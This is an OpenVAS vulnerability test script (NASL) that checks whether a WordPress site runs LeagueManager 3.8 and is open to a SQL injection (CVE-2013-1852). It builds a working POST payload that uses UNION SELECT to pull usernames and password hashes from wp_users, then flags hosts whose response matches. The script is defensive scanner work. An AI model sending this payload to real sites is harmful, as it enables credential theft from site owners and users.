###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_leaguemanager_plugin_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Wordpress LeagueManager Plugin Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to inject or manipulate
  SQL queries in the back-end database, allowing for the manipulation or
  disclosure of arbitrary data.
  Impact Level: Application";

tag_summary = "This host is installed with Wordpress LeagueManager Plugin and is
  prone to multiple vulnerabilities.";
tag_solution = "No solution or patch is available as of 18th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/support/plugin/leaguemanager";
tag_insight = "Multiple flaws due to,
  - Input passed via the 'league_id' POST parameter to wp-admin/admin.php is
    not properly sanitized before being returned to the user.
  - Not sufficiently verify authorization when accessing the CSV export
    functionality.";
tag_affected = "WordPress LeagueManager Plugin Version 3.8";

if(description)
{
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_id(803439);
  script_version("$Revision: 11 $");
  script_bugtraq_id(58503);
  script_cve_id("CVE-2013-1852");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-18 10:46:35 +0530 (Mon, 18 Mar 2013)");
  script_name("Wordpress LeagueManager Plugin Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_xref(name : "URL" , value : "http://osvdb.org/91442");
  script_xref(name : "URL" , value : "http://1337day.com/exploit/20511");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013030138");
  script_xref(name : "URL" , value : "http://www.mondounix.com/wordpress-leaguemanager-3-8-sql-injection");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wordpress-leaguemanager-38-sql-injection");

  script_description(desc);
  script_summary("Check if WordPress LeagueManager Plugin is vulnerable sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

## Variable Initialization
url = "";
port = "";
sndReq = "";
rcvRes = "";
postData = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_dir_from_kb(port:port, app:"WordPress")){
  exit(0);
}

## Construct attack request
url = dir + "/wp-admin/admin.php?page=leaguemanager-export";
postData = "league_id=7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,9,10,11,12,13,"+
           "user_pass,15,16,17,18,19,20,21,22,23,24 from wp_users--&mode=teams&"+
           "leaguemanager_export=Download+File";

sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData, "\r\n");

## Send request and receive the response
rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

## Confirm exploit worked by checking the response
if(rcvRes && rcvRes =~ 'Season.*Team.*Website.*Coach.*Home'){
  security_hole(port);
}
